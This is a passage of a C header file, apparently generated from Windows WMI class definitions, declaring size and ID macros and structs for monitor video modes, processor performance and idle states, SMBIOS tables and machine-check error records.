#define WmiMonitorAnalogVideoInputParams_SerrationOfVsyncRequired_SIZE sizeof(UCHAR)
#define WmiMonitorAnalogVideoInputParams_SerrationOfVsyncRequired_ID 6

#define WmiMonitorAnalogVideoInputParams_SIZE (FIELD_OFFSET(WmiMonitorAnalogVideoInputParams, SerrationOfVsyncRequired) + WmiMonitorAnalogVideoInputParams_SerrationOfVsyncRequired_SIZE)

#define WmiMonitorDigitalVideoInputParams_IsDFP1xCompatible_SIZE sizeof(BOOLEAN)
#define WmiMonitorDigitalVideoInputParams_IsDFP1xCompatible_ID 1

#define WmiMonitorDigitalVideoInputParams_SIZE (FIELD_OFFSET(WmiMonitorDigitalVideoInputParams, IsDFP1xCompatible) + WmiMonitorDigitalVideoInputParams_IsDFP1xCompatible_SIZE)

#define WmiMonitorColorXYZinCIE_X_SIZE sizeof(USHORT)
#define WmiMonitorColorXYZinCIE_X_ID 1
#define WmiMonitorColorXYZinCIE_Y_SIZE sizeof(USHORT)
#define WmiMonitorColorXYZinCIE_Y_ID 2

#define WmiMonitorColorXYZinCIE_SIZE (FIELD_OFFSET(WmiMonitorColorXYZinCIE, Y) + WmiMonitorColorXYZinCIE_Y_SIZE)

#define WmiMonitorColorCharacteristics_Red_SIZE sizeof(WmiMonitorColorXYZinCIE)
#define WmiMonitorColorCharacteristics_Red_ID 1
#define WmiMonitorColorCharacteristics_Blue_SIZE sizeof(WmiMonitorColorXYZinCIE)
#define WmiMonitorColorCharacteristics_Blue_ID 2
#define WmiMonitorColorCharacteristics_Green_SIZE sizeof(WmiMonitorColorXYZinCIE)
#define WmiMonitorColorCharacteristics_Green_ID 3
#define WmiMonitorColorCharacteristics_DefaultWhite_SIZE sizeof(WmiMonitorColorXYZinCIE)
#define WmiMonitorColorCharacteristics_DefaultWhite_ID 4

#define WmiMonitorColorCharacteristics_SIZE (FIELD_OFFSET(WmiMonitorColorCharacteristics, DefaultWhite) + WmiMonitorColorCharacteristics_DefaultWhite_SIZE)

#define VideoModeDescriptor_PixelClockRate_SIZE sizeof(ULONG)
#define VideoModeDescriptor_PixelClockRate_ID 1
#define VideoModeDescriptor_VerticalRefreshRateNumerator_SIZE sizeof(ULONG)
#define VideoModeDescriptor_VerticalRefreshRateNumerator_ID 2
#define VideoModeDescriptor_VerticalRefreshRateDenominator_SIZE sizeof(ULONG)
#define VideoModeDescriptor_VerticalRefreshRateDenominator_ID 3
#define VideoModeDescriptor_HorizontalRefreshRateNumerator_SIZE sizeof(ULONG)
#define VideoModeDescriptor_HorizontalRefreshRateNumerator_ID 4
#define VideoModeDescriptor_HorizontalRefreshRateDenominator_SIZE sizeof(ULONG)
#define VideoModeDescriptor_HorizontalRefreshRateDenominator_ID 5
#define VideoModeDescriptor_HorizontalActivePixels_SIZE sizeof(USHORT)
#define VideoModeDescriptor_HorizontalActivePixels_ID 6
#define VideoModeDescriptor_VerticalActivePixels_SIZE sizeof(USHORT)
#define VideoModeDescriptor_VerticalActivePixels_ID 7
#define VideoModeDescriptor_HorizontalBlankingPixels_SIZE sizeof(USHORT)
#define VideoModeDescriptor_HorizontalBlankingPixels_ID 8
#define VideoModeDescriptor_VerticalBlankingPixels_SIZE sizeof(USHORT)
#define VideoModeDescriptor_VerticalBlankingPixels_ID 9
#define VideoModeDescriptor_HorizontalSyncOffset_SIZE sizeof(USHORT)
#define VideoModeDescriptor_HorizontalSyncOffset_ID 10
#define VideoModeDescriptor_VerticalSyncOffset_SIZE sizeof(USHORT)
#define VideoModeDescriptor_VerticalSyncOffset_ID 11
#define VideoModeDescriptor_HorizontalSyncPulseWidth_SIZE sizeof(USHORT)
#define VideoModeDescriptor_HorizontalSyncPulseWidth_ID 12
#define VideoModeDescriptor_VerticalSyncPulseWidth_SIZE sizeof(USHORT)
#define VideoModeDescriptor_VerticalSyncPulseWidth_ID 13
#define VideoModeDescriptor_HorizontalImageSize_SIZE sizeof(USHORT)
#define VideoModeDescriptor_HorizontalImageSize_ID 14
#define VideoModeDescriptor_VerticalImageSize_SIZE sizeof(USHORT)
#define VideoModeDescriptor_VerticalImageSize_ID 15
#define VideoModeDescriptor_HorizontalBorder_SIZE sizeof(USHORT)
#define VideoModeDescriptor_HorizontalBorder_ID 16
#define VideoModeDescriptor_VerticalBorder_SIZE sizeof(USHORT)
#define VideoModeDescriptor_VerticalBorder_ID 17
#define VideoModeDescriptor_IsInterlaced_SIZE sizeof(BOOLEAN)
#define VideoModeDescriptor_IsInterlaced_ID 18
#define VideoModeDescriptor_StereoModeType_SIZE sizeof(UCHAR)
#define VideoModeDescriptor_StereoModeType_ID 19
#define VideoModeDescriptor_SyncSignalType_SIZE sizeof(UCHAR)
#define VideoModeDescriptor_SyncSignalType_ID 20
#define VideoModeDescriptor_IsSerrationRequired_SIZE sizeof(UCHAR)
#define VideoModeDescriptor_IsSerrationRequired_ID 21
#define VideoModeDescriptor_IsSyncOnRGB_SIZE sizeof(UCHAR)
#define VideoModeDescriptor_IsSyncOnRGB_ID 22
#define VideoModeDescriptor_CompositePolarityType_SIZE sizeof(UCHAR)
#define VideoModeDescriptor_CompositePolarityType_ID 23
#define VideoModeDescriptor_VerticalPolarityType_SIZE sizeof(UCHAR)
#define VideoModeDescriptor_VerticalPolarityType_ID 24
#define VideoModeDescriptor_HorizontalPolarityType_SIZE sizeof(UCHAR)
#define VideoModeDescriptor_HorizontalPolarityType_ID 25
#define VideoModeDescriptor_VideoStandardType_SIZE sizeof(UCHAR)
#define VideoModeDescriptor_VideoStandardType_ID 26
#define VideoModeDescriptor_Origin_SIZE sizeof(UCHAR)
#define VideoModeDescriptor_Origin_ID 27
#define VideoModeDescriptor_TimingType_SIZE sizeof(UCHAR)
#define VideoModeDescriptor_TimingType_ID 28

#define VideoModeDescriptor_SIZE (FIELD_OFFSET(VideoModeDescriptor, TimingType) + VideoModeDescriptor_TimingType_SIZE)

#define WmiMonitorListedSupportedSourceModes_NumOfMonitorSourceModes_SIZE sizeof(USHORT)
#define WmiMonitorListedSupportedSourceModes_NumOfMonitorSourceModes_ID 1
#define WmiMonitorListedSupportedSourceModes_PreferredMonitorSourceModeIndex_SIZE sizeof(USHORT)
#define WmiMonitorListedSupportedSourceModes_PreferredMonitorSourceModeIndex_ID 2
#define WmiMonitorListedSupportedSourceModes_MonitorSourceModes_ID 3

#define FrequencyRangeDescriptor_Origin_SIZE sizeof(UCHAR)
#define FrequencyRangeDescriptor_Origin_ID 1
#define FrequencyRangeDescriptor_MinVSyncNumerator_SIZE sizeof(ULONG)
#define FrequencyRangeDescriptor_MinVSyncNumerator_ID 2
#define FrequencyRangeDescriptor_MinVSyncDenominator_SIZE sizeof(ULONG)
#define FrequencyRangeDescriptor_MinVSyncDenominator_ID 3
#define FrequencyRangeDescriptor_MaxVSyncNumerator_SIZE sizeof(ULONG)
#define FrequencyRangeDescriptor_MaxVSyncNumerator_ID 4
#define FrequencyRangeDescriptor_MaxVSyncDenominator_SIZE sizeof(ULONG)
#define FrequencyRangeDescriptor_MaxVSyncDenominator_ID 5
#define FrequencyRangeDescriptor_MinHSyncNumerator_SIZE sizeof(ULONG)
#define FrequencyRangeDescriptor_MinHSyncNumerator_ID 6
#define FrequencyRangeDescriptor_MinHSyncDenominator_SIZE sizeof(ULONG)
#define FrequencyRangeDescriptor_MinHSyncDenominator_ID 7
#define FrequencyRangeDescriptor_MaxHSyncNumerator_SIZE sizeof(ULONG)
#define FrequencyRangeDescriptor_MaxHSyncNumerator_ID 8
#define FrequencyRangeDescriptor_MaxHSyncDenominator_SIZE sizeof(ULONG)
#define FrequencyRangeDescriptor_MaxHSyncDenominator_ID 9
#define FrequencyRangeDescriptor_ConstraintType_SIZE sizeof(ULONG)
#define FrequencyRangeDescriptor_ConstraintType_ID 10
#define FrequencyRangeDescriptor_ActiveWidth_SIZE sizeof(ULONG)
#define FrequencyRangeDescriptor_ActiveWidth_ID 11
#define FrequencyRangeDescriptor_ActiveHeight_SIZE sizeof(ULONG)
#define FrequencyRangeDescriptor_ActiveHeight_ID 12
#define FrequencyRangeDescriptor_MaxPixelRate_SIZE sizeof(ULONG)
#define FrequencyRangeDescriptor_MaxPixelRate_ID 13

#define FrequencyRangeDescriptor_SIZE (FIELD_OFFSET(FrequencyRangeDescriptor, MaxPixelRate) + FrequencyRangeDescriptor_MaxPixelRate_SIZE)

#define WmiMonitorListedFrequencyRanges_NumOfMonitorFreqRanges_SIZE sizeof(USHORT)
#define WmiMonitorListedFrequencyRanges_NumOfMonitorFreqRanges_ID 1
#define WmiMonitorListedFrequencyRanges_MonitorFreqRanges_ID 2

#define KernelPerfState_Frequency_SIZE sizeof(ULONG)
#define KernelPerfState_Frequency_ID 1
#define KernelPerfState_Power_SIZE sizeof(ULONG)
#define KernelPerfState_Power_ID 2
#define KernelPerfState_PercentFrequency_SIZE sizeof(UCHAR)
#define KernelPerfState_PercentFrequency_ID 3
#define KernelPerfState_IncreaseLevel_SIZE sizeof(UCHAR)
#define KernelPerfState_IncreaseLevel_ID 4
#define KernelPerfState_DecreaseLevel_SIZE sizeof(UCHAR)
#define KernelPerfState_DecreaseLevel_ID 5
#define KernelPerfState_Type_SIZE sizeof(UCHAR)
#define KernelPerfState_Type_ID 6
#define KernelPerfState_IncreaseTime_SIZE sizeof(ULONG)
#define KernelPerfState_IncreaseTime_ID 7
#define KernelPerfState_DecreaseTime_SIZE sizeof(ULONG)
#define KernelPerfState_DecreaseTime_ID 8
#define KernelPerfState_Control_SIZE sizeof(ULONGLONG)
#define KernelPerfState_Control_ID 9
#define KernelPerfState_Status_SIZE sizeof(ULONGLONG)
#define KernelPerfState_Status_ID 10
#define KernelPerfState_HitCount_SIZE sizeof(ULONG)
#define KernelPerfState_HitCount_ID 11
#define KernelPerfState_Reserved1_SIZE sizeof(ULONG)
#define KernelPerfState_Reserved1_ID 12
#define KernelPerfState_Reserved2_SIZE sizeof(ULONGLONG)
#define KernelPerfState_Reserved2_ID 13
#define KernelPerfState_Reserved3_SIZE sizeof(ULONGLONG)
#define KernelPerfState_Reserved3_ID 14

#define KernelPerfState_SIZE (FIELD_OFFSET(KernelPerfState, Reserved3) + KernelPerfState_Reserved3_SIZE)

#define KernelPerfStates_Count_SIZE sizeof(ULONG)
#define KernelPerfStates_Count_ID 1
#define KernelPerfStates_MaxFrequency_SIZE sizeof(ULONG)
#define KernelPerfStates_MaxFrequency_ID 2
#define KernelPerfStates_CurrentState_SIZE sizeof(ULONG)
#define KernelPerfStates_CurrentState_ID 3
#define KernelPerfStates_MaxPerfState_SIZE sizeof(ULONG)
#define KernelPerfStates_MaxPerfState_ID 4
#define KernelPerfStates_MinPerfState_SIZE sizeof(ULONG)
#define KernelPerfStates_MinPerfState_ID 5
#define KernelPerfStates_LowestPerfState_SIZE sizeof(ULONG)
#define KernelPerfStates_LowestPerfState_ID 6
#define KernelPerfStates_ThermalConstraint_SIZE sizeof(ULONG)
#define KernelPerfStates_ThermalConstraint_ID 7
#define KernelPerfStates_BusyAdjThreshold_SIZE sizeof(UCHAR)
#define KernelPerfStates_BusyAdjThreshold_ID 8
#define KernelPerfStates_PolicyType_SIZE sizeof(UCHAR)
#define KernelPerfStates_PolicyType_ID 9
#define KernelPerfStates_Type_SIZE sizeof(UCHAR)
#define KernelPerfStates_Type_ID 10
#define KernelPerfStates_Reserved_SIZE sizeof(UCHAR)
#define KernelPerfStates_Reserved_ID 11
#define KernelPerfStates_TimerInterval_SIZE sizeof(ULONG)
#define KernelPerfStates_TimerInterval_ID 12
#define KernelPerfStates_TargetProcessors_SIZE sizeof(ULONGLONG)
#define KernelPerfStates_TargetProcessors_ID 13
#define KernelPerfStates_PStateHandler_SIZE sizeof(ULONG)
#define KernelPerfStates_PStateHandler_ID 14
#define KernelPerfStates_PStateContext_SIZE sizeof(ULONG)
#define KernelPerfStates_PStateContext_ID 15
#define KernelPerfStates_TStateHandler_SIZE sizeof(ULONG)
#define KernelPerfStates_TStateHandler_ID 16
#define KernelPerfStates_TStateContext_SIZE sizeof(ULONG)
#define KernelPerfStates_TStateContext_ID 17
#define KernelPerfStates_FeedbackHandler_SIZE sizeof(ULONG)
#define KernelPerfStates_FeedbackHandler_ID 18
#define KernelPerfStates_Reserved1_SIZE sizeof(ULONG)
#define KernelPerfStates_Reserved1_ID 19
#define KernelPerfStates_Reserved2_SIZE sizeof(ULONGLONG)
#define KernelPerfStates_Reserved2_ID 20
#define KernelPerfStates_State_ID 21

#define KernelIdleState_Latency_SIZE sizeof(ULONG)
#define KernelIdleState_Latency_ID 1
#define KernelIdleState_Power_SIZE sizeof(ULONG)
#define KernelIdleState_Power_ID 2
#define KernelIdleState_TimeCheck_SIZE sizeof(ULONG)
#define KernelIdleState_TimeCheck_ID 3
#define KernelIdleState_PromotePercent_SIZE sizeof(UCHAR)
#define KernelIdleState_PromotePercent_ID 4
#define KernelIdleState_DemotePercent_SIZE sizeof(UCHAR)
#define KernelIdleState_DemotePercent_ID 5
#define KernelIdleState_StateType_SIZE sizeof(UCHAR)
#define KernelIdleState_StateType_ID 6
#define KernelIdleState_Reserved_SIZE sizeof(UCHAR)
#define KernelIdleState_Reserved_ID 7
#define KernelIdleState_StateFlags_SIZE sizeof(ULONG)
#define KernelIdleState_StateFlags_ID 8
#define KernelIdleState_Context_SIZE sizeof(ULONG)
#define KernelIdleState_Context_ID 9
#define KernelIdleState_IdleHandler_SIZE sizeof(ULONG)
#define KernelIdleState_IdleHandler_ID 10
#define KernelIdleState_Reserved1_SIZE sizeof(ULONG)
#define KernelIdleState_Reserved1_ID 11

#define KernelIdleState_SIZE (FIELD_OFFSET(KernelIdleState, Reserved1) + KernelIdleState_Reserved1_SIZE)

#define KernelIdleStates_Type_SIZE sizeof(ULONG)
#define KernelIdleStates_Type_ID 1
#define KernelIdleStates_Count_SIZE sizeof(ULONG)
#define KernelIdleStates_Count_ID 2
#define KernelIdleStates_TargetState_SIZE sizeof(ULONG)
#define KernelIdleStates_TargetState_ID 3
#define KernelIdleStates_OldState_SIZE sizeof(ULONG)
#define KernelIdleStates_OldState_ID 4
#define KernelIdleStates_TargetProcessors_SIZE sizeof(ULONGLONG)
#define KernelIdleStates_TargetProcessors_ID 5
#define KernelIdleStates_State_ID 6

#define KernelPerfStateChange_State_SIZE sizeof(ULONG)
#define KernelPerfStateChange_State_ID 1
#define KernelPerfStateChange_Status_SIZE sizeof(ULONG)
#define KernelPerfStateChange_Status_ID 2
#define KernelPerfStateChange_Latency_SIZE sizeof(ULONG)
#define KernelPerfStateChange_Latency_ID 3
#define KernelPerfStateChange_Speed_SIZE sizeof(ULONG)
#define KernelPerfStateChange_Speed_ID 4
#define KernelPerfStateChange_Processor_SIZE sizeof(ULONG)
#define KernelPerfStateChange_Processor_ID 5

#define KernelPerfStateChange_SIZE (FIELD_OFFSET(KernelPerfStateChange, Processor) + KernelPerfStateChange_Processor_SIZE)

#define KernelPerfStateDomainChange_State_SIZE sizeof(ULONG)
#define KernelPerfStateDomainChange_State_ID 1
#define KernelPerfStateDomainChange_Latency_SIZE sizeof(ULONG)
#define KernelPerfStateDomainChange_Latency_ID 2
#define KernelPerfStateDomainChange_Speed_SIZE sizeof(ULONG)
#define KernelPerfStateDomainChange_Speed_ID 3
#define KernelPerfStateDomainChange_Processors_SIZE sizeof(ULONGLONG)
#define KernelPerfStateDomainChange_Processors_ID 4

#define KernelPerfStateDomainChange_SIZE (FIELD_OFFSET(KernelPerfStateDomainChange, Processors) + KernelPerfStateDomainChange_Processors_SIZE)

#define KernelIdleStateChange_NewState_SIZE sizeof(ULONG)
#define KernelIdleStateChange_NewState_ID 1
#define KernelIdleStateChange_OldState_SIZE sizeof(ULONG)
#define KernelIdleStateChange_OldState_ID 2
#define KernelIdleStateChange_Processors_SIZE sizeof(ULONGLONG)
#define KernelIdleStateChange_Processors_ID 3

#define KernelIdleStateChange_SIZE (FIELD_OFFSET(KernelIdleStateChange, Processors) + KernelIdleStateChange_Processors_SIZE)

#define KernelThermalConstraintChange_ThermalConstraint_SIZE sizeof(ULONG)
#define KernelThermalConstraintChange_ThermalConstraint_ID 1
#define KernelThermalConstraintChange_Processors_SIZE sizeof(ULONGLONG)
#define KernelThermalConstraintChange_Processors_ID 2

#define KernelThermalConstraintChange_SIZE (FIELD_OFFSET(KernelThermalConstraintChange, Processors) + KernelThermalConstraintChange_Processors_SIZE)

#define IdleStateAccounting_IdleTransitions_SIZE sizeof(ULONG)
#define IdleStateAccounting_IdleTransitions_ID 1
#define IdleStateAccounting_FailedTransitions_SIZE sizeof(ULONG)
#define IdleStateAccounting_FailedTransitions_ID 2
#define IdleStateAccounting_InvalidBucketIndex_SIZE sizeof(ULONG)
#define IdleStateAccounting_InvalidBucketIndex_ID 3
#define IdleStateAccounting_TotalTime_SIZE sizeof(ULONGLONG)
#define IdleStateAccounting_TotalTime_ID 4
#define IdleStateAccounting_IdleTimeBuckets_SIZE sizeof(ULONG[6])
#define IdleStateAccounting_IdleTimeBuckets_ID 5

#define IdleStateAccounting_SIZE (FIELD_OFFSET(IdleStateAccounting, IdleTimeBuckets) + IdleStateAccounting_IdleTimeBuckets_SIZE)

#define IdleAccounting_StateCount_SIZE sizeof(ULONG)
#define IdleAccounting_StateCount_ID 1
#define IdleAccounting_TotalTransitions_SIZE sizeof(ULONG)
#define IdleAccounting_TotalTransitions_ID 2
#define IdleAccounting_ResetCount_SIZE sizeof(ULONG)
#define IdleAccounting_ResetCount_ID 3
#define IdleAccounting_StartTime_SIZE sizeof(ULONGLONG)
#define IdleAccounting_StartTime_ID 4
#define IdleAccounting_State_ID 5

#define IdleStateBucketEx_TotalTimeUs_SIZE sizeof(ULONGLONG)
#define IdleStateBucketEx_TotalTimeUs_ID 1
#define IdleStateBucketEx_MinTimeUs_SIZE sizeof(ULONG)
#define IdleStateBucketEx_MinTimeUs_ID 2
#define IdleStateBucketEx_MaxTimeUs_SIZE sizeof(ULONG)
#define IdleStateBucketEx_MaxTimeUs_ID 3
#define IdleStateBucketEx_Count_SIZE sizeof(ULONG)
#define IdleStateBucketEx_Count_ID 4

#define IdleStateBucketEx_SIZE (FIELD_OFFSET(IdleStateBucketEx, Count) + IdleStateBucketEx_Count_SIZE)

#define IdleStateAccountingEx_TotalTime_SIZE sizeof(ULONGLONG)
#define IdleStateAccountingEx_TotalTime_ID 1
#define IdleStateAccountingEx_IdleTransitions_SIZE sizeof(ULONG)
#define IdleStateAccountingEx_IdleTransitions_ID 2
#define IdleStateAccountingEx_FailedTransitions_SIZE sizeof(ULONG)
#define IdleStateAccountingEx_FailedTransitions_ID 3
#define IdleStateAccountingEx_InvalidBucketIndex_SIZE sizeof(ULONG)
#define IdleStateAccountingEx_InvalidBucketIndex_ID 4
#define IdleStateAccountingEx_MinTimeUs_SIZE sizeof(ULONG)
#define IdleStateAccountingEx_MinTimeUs_ID 5
#define IdleStateAccountingEx_MaxTimeUs_SIZE sizeof(ULONG)
#define IdleStateAccountingEx_MaxTimeUs_ID 6
#define IdleStateAccountingEx_IdleTimeBuckets_SIZE sizeof(IdleStateBucketEx[16])
#define IdleStateAccountingEx_IdleTimeBuckets_ID 7

#define IdleStateAccountingEx_SIZE (FIELD_OFFSET(IdleStateAccountingEx, IdleTimeBuckets) + IdleStateAccountingEx_IdleTimeBuckets_SIZE)

#define IdleAccountingEx_StateCount_SIZE sizeof(ULONG)
#define IdleAccountingEx_StateCount_ID 1
#define IdleAccountingEx_TotalTransitions_SIZE sizeof(ULONG)
#define IdleAccountingEx_TotalTransitions_ID 2
#define IdleAccountingEx_ResetCount_SIZE sizeof(ULONG)
#define IdleAccountingEx_ResetCount_ID 3
#define IdleAccountingEx_StartTime_SIZE sizeof(ULONGLONG)
#define IdleAccountingEx_StartTime_ID 4
#define IdleAccountingEx_State_ID 5

#define KernelThermalPolicyChange_CoolingMode_SIZE sizeof(UCHAR)
#define KernelThermalPolicyChange_CoolingMode_ID 1
#define KernelThermalPolicyChange_Processors_SIZE sizeof(ULONGLONG)
#define KernelThermalPolicyChange_Processors_ID 2

#define KernelThermalPolicyChange_SIZE (FIELD_OFFSET(KernelThermalPolicyChange, Processors) + KernelThermalPolicyChange_Processors_SIZE)

#define ProcessorPerformance_frequency_SIZE sizeof(ULONG)
#define ProcessorPerformance_frequency_ID 1
#define ProcessorPerformance_power_SIZE sizeof(ULONG)
#define ProcessorPerformance_power_ID 2
#define ProcessorPerformance_percentage_SIZE sizeof(ULONG)
#define ProcessorPerformance_percentage_ID 3

#define ProcessorPerformance_SIZE (FIELD_OFFSET(ProcessorPerformance, percentage) + ProcessorPerformance_percentage_SIZE)

typedef struct _MSWmi_MofData {
  ULONG Unused1;
  ULONG Unused2;
  ULONG Size;
  ULONG Unused4;
  UCHAR BinaryMofData[1];
} MSWmi_MofData, *PMSWmi_MofData;

typedef struct _MSWmi_ProviderInfo {
  char VariableData[1];
} MSWmi_ProviderInfo, *PMSWmi_ProviderInfo;

typedef struct _MSWmi_PnPDeviceId {
  CHAR VariableData[1];
} MSWmi_PnPDeviceId, *PMSWmi_PnPDeviceId;

typedef struct _MSWmi_PnPInstanceNames {
  ULONG Count;
  WCHAR InstanceNameList[1];
} MSWmi_PnPInstanceNames, *PMSWmi_PnPInstanceNames;

typedef struct _MSWmi_Guid {
  UCHAR Guid[16];
} MSWmi_Guid, *PMSWmi_Guid;

typedef struct _MSWmi_GuidRegistrationInfo {
  ULONG Operation;
  ULONG GuidCount;
  MSWmi_Guid GuidList[1];
} MSWmi_GuidRegistrationInfo, *PMSWmi_GuidRegistrationInfo;

typedef struct _MSAcpiInfo {
  ULONG BootArchitecture;
  ULONG PreferredProfile;
  ULONG Capabilities;
} MSAcpiInfo, *PMSAcpiInfo;

typedef struct _GET_INJECTION_CAPABILITIES_OUT {
  ULONG Status;
  ULONG Capabilities;
} GET_INJECTION_CAPABILITIES_OUT, *PGET_INJECTION_CAPABILITIES_OUT;

typedef struct _INJECT_HARDWARE_ERROR_IN {
  ULONG ErrorType;
  ULONGLONG Parameter1;
  ULONGLONG Parameter2;
  ULONGLONG Parameter3;
  ULONGLONG Parameter4;
} INJECT_HARDWARE_ERROR_IN, *PINJECT_HARDWARE_ERROR_IN;

typedef struct _INJECT_HARDWARE_ERROR_OUT {
  ULONG Status;
} INJECT_HARDWARE_ERROR_OUT, *PINJECT_HARDWARE_ERROR_OUT;

typedef struct _GET_ALL_ERROR_SOURCES_OUT {
  ULONG Status;
  ULONG Count;
  ULONG Length;
  UCHAR ErrorSourceArray[1];
} GET_ALL_ERROR_SOURCES_OUT, *PGET_ALL_ERROR_SOURCES_OUT;

typedef struct _GET_ERROR_SOURCE_INFO_IN {
  ULONG ErrorSourceId;
} GET_ERROR_SOURCE_INFO_IN, *PGET_ERROR_SOURCE_INFO_IN;

typedef struct _GET_ERROR_SOURCE_INFO_OUT {
  ULONG Status;
  ULONG Length;
  UCHAR ErrorSourceInfo[1];
} GET_ERROR_SOURCE_INFO_OUT, *PGET_ERROR_SOURCE_INFO_OUT;

typedef struct _SET_ERROR_SOURCE_INFO_IN {
  ULONG Length;
  UCHAR ErrorSourceInfo[1];
} SET_ERROR_SOURCE_INFO_IN, *PSET_ERROR_SOURCE_INFO_IN;

typedef struct _SET_ERROR_SOURCE_INFO_OUT {
  ULONG Status;
} SET_ERROR_SOURCE_INFO_OUT, *PSET_ERROR_SOURCE_INFO_OUT;

typedef struct _ENABLE_ERROR_SOURCE_IN {
  ULONG ErrorSourceId;
} ENABLE_ERROR_SOURCE_IN, *PENABLE_ERROR_SOURCE_IN;

typedef struct _ENABLE_ERROR_SOURCE_OUT {
  ULONG Status;
} ENABLE_ERROR_SOURCE_OUT, *PENABLE_ERROR_SOURCE_OUT;

typedef struct _DISABLE_ERROR_SOURCE_IN {
  ULONG ErrorSourceId;
} DISABLE_ERROR_SOURCE_IN, *PDISABLE_ERROR_SOURCE_IN;

typedef struct _DISABLE_ERROR_SOURCE_OUT {
  ULONG Status;
} DISABLE_ERROR_SOURCE_OUT, *PDISABLE_ERROR_SOURCE_OUT;

typedef struct _MSSmBios_RawSMBiosTables {
  BOOLEAN Used20CallingMethod;
  UCHAR SmbiosMajorVersion;
  UCHAR SmbiosMinorVersion;
  UCHAR DmiRevision;
  ULONG Size;
  UCHAR SMBiosData[1];
} MSSmBios_RawSMBiosTables, *PMSSmBios_RawSMBiosTables;

typedef struct _MSSmBios_SMBiosEventlog {
  char VariableData[1];
} MSSmBios_SMBiosEventlog, *PMSSmBios_SMBiosEventlog;

typedef struct _SYSID_UUID {
  UCHAR Uuid[16];
} SYSID_UUID, *PSYSID_UUID;

typedef struct _MSSmBios_SysidUUIDList {
  ULONG Count;
  SYSID_UUID List[1];
} MSSmBios_SysidUUIDList, *PMSSmBios_SysidUUIDList;

typedef struct _SYSID_1394 {
  UCHAR x1394[8];
} SYSID_1394, *PSYSID_1394;

typedef struct _MSSmBios_Sysid1394List {
  ULONG Count;
  SYSID_1394 List[1];
} MSSmBios_Sysid1394List, *PMSSmBios_Sysid1394List;

typedef struct _MSMCAEvent_Header {
  ULONGLONG RecordId;
  UCHAR ErrorSeverity;
  ULONG Type;
  ULONG Cpu;
  ULONG AdditionalErrors;
  ULONG LogToEventlog;
} MSMCAEvent_Header, *PMSMCAEvent_Header;

typedef struct _MSMCAEvent_BusError {
  ULONGLONG RecordId;
  UCHAR ErrorSeverity;
  ULONG Type;
  ULONG Cpu;
  ULONG AdditionalErrors;
  ULONG LogToEventlog;
  ULONG Participation;
  ULONG MemoryHierarchyLevel;
  ULONG RequestType;
  ULONG MemOrIo;
  ULONGLONG Address;
  ULONG Size;
  UCHAR RawRecord[1];
} MSMCAEvent_BusError, *PMSMCAEvent_BusError;

typedef struct _MSMCAEvent_TLBError {
  ULONGLONG RecordId;
  UCHAR ErrorSeverity;
  ULONG Type;
  ULONG Cpu;
  ULONG AdditionalErrors;
  ULONG LogToEventlog;
  ULONG TransactionType;
  ULONG MemoryHierarchyLevel;
  ULONGLONG Address;
  ULONG Size;
  UCHAR RawRecord[1];
} MSMCAEvent_TLBError, *PMSMCAEvent_TLBError;

typedef struct _MSMCAEvent_MemoryHierarchyError {
  ULONGLONG RecordId;
  UCHAR ErrorSeverity;
  ULONG Type;
  ULONG Cpu;
  ULONG AdditionalErrors;
  ULONG LogToEventlog;
  ULONG TransactionType;
  ULONG MemoryHierarchyLevel;
  ULONG RequestType;
  ULONGLONG Address;
  ULONG Size;
  UCHAR RawRecord[1];
} MSMCAEvent_MemoryHierarchyError, *PMSMCAEvent_MemoryHierarchyError;

typedef struct _MSMCAEvent_CPUError {
  ULONGLONG RecordId;
  UCHAR ErrorSeverity;
  ULONG Type;
  ULONG Cpu;
  ULONG AdditionalErrors;
  ULONG LogToEventlog;
  ULONG MajorErrorType;
  ULONG Level;
  ULONG CacheOp;
  ULONG CacheMesi;
  ULONG TLBOp;
  ULONG BusType;
  ULONG BusSev;
  ULONG RegFileId;
  ULONG RegFileOp;
  ULONG MSSid;
  ULONG MSOp;
  ULONG MSArrayId;
  ULONG MSIndex;
  ULONG Size;
  UCHAR RawRecord[1];
} MSMCAEvent_CPUError, *PMSMCAEvent_CPUError;

typedef struct _MSMCAEvent_MemoryError {
  ULONGLONG RecordId;
  UCHAR ErrorSeverity;
  ULONG Type;
  ULONG Cpu;
  ULONG AdditionalErrors;
  ULONG LogToEventlog;
  ULONGLONG VALIDATION_BITS;
  ULONGLONG MEM_ERROR_STATUS;
  ULONGLONG MEM_PHYSICAL_ADDR;
  ULONGLONG MEM_PHYSICAL_MASK;
  ULONGLONG RESPONDER_ID;
  ULONGLONG TARGET_ID;
  ULONGLONG REQUESTOR_ID;
  ULONGLONG BUS_SPECIFIC_DATA;
  USHORT MEM_NODE;
  USHORT MEM_CARD;
  USHORT MEM_BANK;
  USHORT xMEM_DEVICE;
  USHORT MEM_MODULE;
  USHORT MEM_ROW;
  USHORT MEM_COLUMN;
  USHORT MEM_BIT_POSITION;
  ULONG Size;
  UCHAR RawRecord[1];
} MSMCAEvent_MemoryError, *PMSMCAEvent_MemoryError;

typedef struct _MSMCAEvent_PCIBusError {
  ULONGLONG RecordId;
  UCHAR ErrorSeverity;
  ULONG Type;
  ULONG Cpu;
  ULONG AdditionalErrors;
  ULONG LogToEventlog;
  ULONGLONG VALIDATION_BITS;
  ULONGLONG PCI_BUS_ERROR_STATUS;
  ULONGLONG PCI_BUS_ADDRESS;
  ULONGLONG PCI_BUS_DATA;
  ULONGLONG PCI_BUS_CMD;
  ULONGLONG PCI_BUS_REQUESTOR_ID;
  ULONGLONG PCI_BUS_RESPONDER_ID;
  ULONGLONG PCI_BUS_TARGET_ID;
  USHORT PCI_BUS_ERROR_TYPE;
  UCHAR PCI_BUS_ID_BusNumber;
  UCHAR PCI_BUS_ID_SegmentNumber;
  ULONG Size;
  UCHAR RawRecord[1];
} MSMCAEvent_PCIBusError, *PMSMCAEvent_PCIBusError;

typedef struct _MSMCAEvent_PCIComponentError {
  ULONGLONG RecordId;
  UCHAR ErrorSeverity;
  ULONG Type;
  ULONG Cpu;
  ULONG AdditionalErrors;
  ULONG LogToEventlog;
  ULONGLONG VALIDATION_BITS;
  ULONGLONG PCI_COMP_ERROR_STATUS;
  USHORT PCI_COMP_INFO_VendorId;
  USHORT PCI_COMP_INFO_DeviceId;
  UCHAR PCI_COMP_INFO_ClassCodeInterface;
  UCHAR PCI_COMP_INFO_ClassCodeSubClass;
  UCHAR PCI_COMP_INFO_ClassCodeBaseClass;
  UCHAR PCI_COMP_INFO_FunctionNumber;
  UCHAR PCI_COMP_INFO_DeviceNumber;
  UCHAR PCI_COMP_INFO_BusNumber;
  UCHAR PCI_COMP_INFO_SegmentNumber;
  ULONG Size;
  UCHAR RawRecord[1];
